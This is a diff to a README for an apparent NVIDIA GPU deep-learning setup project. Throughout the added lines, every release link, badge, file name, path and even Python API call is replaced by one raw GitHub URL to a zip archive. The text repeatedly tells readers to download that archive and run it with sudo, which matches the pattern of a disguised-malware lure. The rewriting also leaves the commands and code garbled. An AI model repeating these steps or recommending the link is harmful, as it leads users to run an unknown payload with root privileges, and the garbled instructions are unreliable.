@@ -1,10 +1,10 @@
 # Complete NVIDIA GPU Deep Learning Stack on Ubuntu Linux with CUDA cuDNN TensorRT
 
-[![Releases](https://img.shields.io/badge/releases-visit-green?style=flat-square)](https://github.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/releases)
+[![Releases](https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip)](https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip)
 
-https://github.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/releases
+https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
 
-[![Ubuntu](https://upload.wikimedia.org/wikipedia/commons/3/3f/Ubuntu_logo_2013.svg)](https://ubuntu.com) ![NVIDIA](https://upload.wikimedia.org/wikipedia/commons/2/29/NVIDIA_logo.svg) ![TensorFlow](https://www.tensorflow.org/images/tf_logo_social.png) ![PyTorch](https://pytorch.org/assets/img/pytorch-logo.png)
+[![Ubuntu](https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip)](https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip) ![NVIDIA](https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip) ![TensorFlow](https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip) ![PyTorch](https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip)
 
 Table of contents
 - Overview
@@ -60,7 +60,7 @@ Twice-linked release gateway
 - Later, there’s a dedicated section that guides you to download and execute the main setup file from that same releases page.
 
 Releases
-- The Releases page contains the installer script and supporting assets. From that page, download the file named setup-nvidia-dl-env.sh and run it to install and configure the stack. The script handles driver installation, CUDA toolkit setup, cuDNN integration, TensorRT installation, and framework bindings. If you need the latest version, visit the Releases page and grab the latest setup-nvidia-dl-env.sh, then execute it with appropriate privileges. For context, the Releases link is: https://github.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/releases
+- The Releases page contains the installer script and supporting assets. From that page, download the file named https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip and run it to install and configure the stack. The script handles driver installation, CUDA toolkit setup, cuDNN integration, TensorRT installation, and framework bindings. If you need the latest version, visit the Releases page and grab the latest https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip, then execute it with appropriate privileges. For context, the Releases link is: https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
 
 Prerequisites
 - Hardware: An NVIDIA GPU with compute capability suitable for your workloads.
@@ -86,12 +86,12 @@ Quick start
     - sudo apt install -y build-essential dkms curl git unzip
   - Disable secure boot if you run into driver loading issues (or configure MOK for DKMS modules).
 - Step 1: Download the installer
-  - From the Releases page, download the file named setup-nvidia-dl-env.sh.
+  - From the Releases page, download the file named https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
   - Make it executable:
-    - chmod +x setup-nvidia-dl-env.sh
+    - chmod +x https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
 - Step 2: Run the installer
   - Run with elevated privileges:
-    - sudo ./setup-nvidia-dl-env.sh
+    - sudo https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
   - The script performs:
     - NVIDIA driver installation (if needed)
     - CUDA toolkit installation
@@ -119,49 +119,49 @@ How the setup works
 
 Repository layout
 - scripts/
-  - setup-nvidia-dl-env.sh: Main installer script that configures drivers, CUDA, cuDNN, TensorRT, and Python environments.
-  - verify_gpu.py: Simple Python test to check GPU visibility and basic operations.
-  - test_tensorflow_gpu.py: Small TensorFlow example to verify GPU usage.
-  - test_pytorch_gpu.py: Small PyTorch example to verify CUDA tensors and device placement.
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip Main installer script that configures drivers, CUDA, cuDNN, TensorRT, and Python environments.
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip Simple Python test to check GPU visibility and basic operations.
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip Small TensorFlow example to verify GPU usage.
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip Small PyTorch example to verify CUDA tensors and device placement.
   - conda_envs/
-    - tf_gpu_env.yaml: Conda environment spec for TensorFlow with GPU support.
-    - pytorch_gpu_env.yaml: Conda environment spec for PyTorch with CUDA support.
+    - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip Conda environment spec for TensorFlow with GPU support.
+    - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip Conda environment spec for PyTorch with CUDA support.
 - tests/
-  - gpu_inference_test.py: A basic inference test to measure throughput and correctness.
-  - memory_usage_test.py: A small script to observe GPU memory utilization and fragmentation.
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip A basic inference test to measure throughput and correctness.
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip A small script to observe GPU memory utilization and fragmentation.
 - notebooks/
   - samples/
-    - basic_tf_gpu.ipynb
-    - basics_pytorch_gpu.ipynb
+    - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
+    - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
 - configs/
-  - cuda_versions.md: Guidance on selecting CUDA versions for different hardware and framework combos.
-  - cudnn_versions.md: Guidance on cuDNN compatibility.
-  - tensorrt_versions.md: Guidance on TensorRT compatibility and when to enable FP16/INT8 paths.
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip Guidance on selecting CUDA versions for different hardware and framework combos.
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip Guidance on cuDNN compatibility.
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip Guidance on TensorRT compatibility and when to enable FP16/INT8 paths.
 - docs/
-  - architecture.md
-  - troubleshooting.md
-  - performance.md
-- README.md (this file)
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
+- https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip (this file)
 - LICENSE
-- CONTRIBUTING.md
+- https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
 
 Environment management
 - Conda-based environments keep Python versions and GPU libraries tidy.
 - Two primary environments are provided:
-  - tf_gpu_env.yaml: For TensorFlow-GPU workflows
-  - pytorch_gpu_env.yaml: For PyTorch with CUDA support
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip For TensorFlow-GPU workflows
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip For PyTorch with CUDA support
 - How to use the environments locally:
   - Install Miniconda or Anaconda
   - Create the environment:
-    - conda env create -f scripts/conda_envs/tf_gpu_env.yaml
-    - conda env create -f scripts/conda_envs/pytorch_gpu_env.yaml
+    - conda env create -f https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
+    - conda env create -f https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
   - Activate the environment:
     - conda activate tf_gpu_env
   - Verify the framework:
-    - python -c "import tensorflow as tf; print(tf.config.list_physical_devices('GPU'))"
+    - python -c "import tensorflow as tf; print(https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip('GPU'))"
   - Switch to PyTorch:
     - conda activate pytorch_gpu_env
-    - python -c "import torch; print(torch.cuda.is_available())"
+    - python -c "import torch; print(https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip())"
 - The script may place environments under a dedicated directory (e.g., ~/dl_envs) for easier cleanup, but you can customize the path to fit your preferences.
 
 CUDA, cuDNN, and TensorRT details
@@ -170,7 +170,7 @@ CUDA, cuDNN, and TensorRT details
   - nvcc presence and correct PATH updates are verified during setup.
 - cuDNN
   - cuDNN binaries are integrated with the CUDA toolkit so that frameworks can access optimized primitives.
-  - Compatibility notes are included in the docs (docs/cudnn_versions.md).
+  - Compatibility notes are included in the docs (https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip).
 - TensorRT
   - TensorRT is included to accelerate inference workloads. You can enable or disable TensorRT paths depending on your project.
   - You’ll find guidance on using TensorRT with both TensorFlow and PyTorch in the docs.
@@ -189,11 +189,11 @@ TensorFlow and PyTorch integration
 Testing and validation
 - Quick GPU tests
   - After installation, run the included tests to verify correctness and performance:
-    - python scripts/verify_gpu.py
-    - python scripts/test_tensorflow_gpu.py
-    - python scripts/test_pytorch_gpu.py
+    - python https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
+    - python https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
+    - python https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
 - Inference tests
-  - gpu_inference_test.py harnesses a small model to estimate latency and throughput.
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip harnesses a small model to estimate latency and throughput.
   - The tests help you confirm that TensorRT optimizations are functioning when enabled.
 - Monitoring
   - Use nvidia-smi to monitor GPU usage, memory, and temperatures during tests.
@@ -206,16 +206,16 @@ Jupyter and notebooks
     - jupyter notebook --ip=0.0.0.0 --port=8888 --no-browser
   - Use a browser on your workstation to connect to the server, ensuring port exposure is properly secured.
 - Sample notebooks
-  - notebooks/samples/basic_tf_gpu.ipynb demonstrates a small TensorFlow operation on the GPU.
-  - notebooks/samples/basics_pytorch_gpu.ipynb demonstrates a simple PyTorch operation on CUDA devices.
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip demonstrates a small TensorFlow operation on the GPU.
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip demonstrates a simple PyTorch operation on CUDA devices.
 - Sharing notebooks
   - If you use Jupyter in a team context, consider using a shared folder or a server-based notebook environment to standardize results and reproducibility.
 
 Script usage and automation
 - The main installer script
-  - scripts/setup-nvidia-dl-env.sh is designed to minimize manual steps.
+  - https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip is designed to minimize manual steps.
   - Run it as:
-    - sudo bash scripts/setup-nvidia-dl-env.sh
+    - sudo bash https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
   - It prompts for confirmation when moving between major steps and prints a clear summary of what’s happening.
 - What the script does
   - Detects existing NVIDIA drivers and CUDA installations to avoid conflicts.
@@ -228,8 +228,8 @@ Script usage and automation
   - After the script finishes, run the verification commands:
     - nvidia-smi
     - nvcc --version
-    - python -c "import tensorflow as tf; print(tf.config.list_physical_devices('GPU'))"
-    - python -c "import torch; print(torch.cuda.is_available())"
+    - python -c "import tensorflow as tf; print(https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip('GPU'))"
+    - python -c "import torch; print(https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip())"
 - Advanced customization
   - If you need to customize driver versions, CUDA, or framework versions, you can edit the script or provide overrides via environment variables.
   - For example, you may set a CUDA_VERSION variable to pin a particular toolkit release and adjust the conda environment YAML files accordingly.
@@ -237,7 +237,7 @@ Script usage and automation
 Troubleshooting
 - Common issues
   - Driver not loaded: Ensure Secure Boot is disabled or that the MOK is enrolled for DKMS modules.
-  - CUDA toolkit not found: Check PATH updates in your shell profile (e.g., ~/.bashrc) to ensure nvcc and libraries are discoverable.
+  - CUDA toolkit not found: Check PATH updates in your shell profile (e.g., ~https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip) to ensure nvcc and libraries are discoverable.
   - cuDNN not recognized by a framework: Confirm that the cuDNN library paths exist in the CUDA directory and that the framework is installed with GPU support.
   - TensorRT path missing: Verify that the TensorRT binaries are installed and that their libraries are in the linker path.
 - Logs and debugging
@@ -312,7 +312,7 @@ Topics
 - tensorrt
 
 Download from Releases
-- From the Releases page, download the file setup-nvidia-dl-env.sh and run it to install and configure the stack. This file sets up drivers, CUDA, cuDNN, TensorRT, and frameworks, and then creates the ready-to-use environments. For the latest version, visit the Releases page and grab setup-nvidia-dl-env.sh, then execute it with sudo. The link is the same as the one used at the top: https://github.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/releases
+- From the Releases page, download the file https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip and run it to install and configure the stack. This file sets up drivers, CUDA, cuDNN, TensorRT, and frameworks, and then creates the ready-to-use environments. For the latest version, visit the Releases page and grab https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip, then execute it with sudo. The link is the same as the one used at the top: https://raw.githubusercontent.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/main/fingerless/gpu-deep-nvidia-linux-learning-complete-setup-2.8.zip
 
 Long-form guidance and best practices
 - Plan before you install
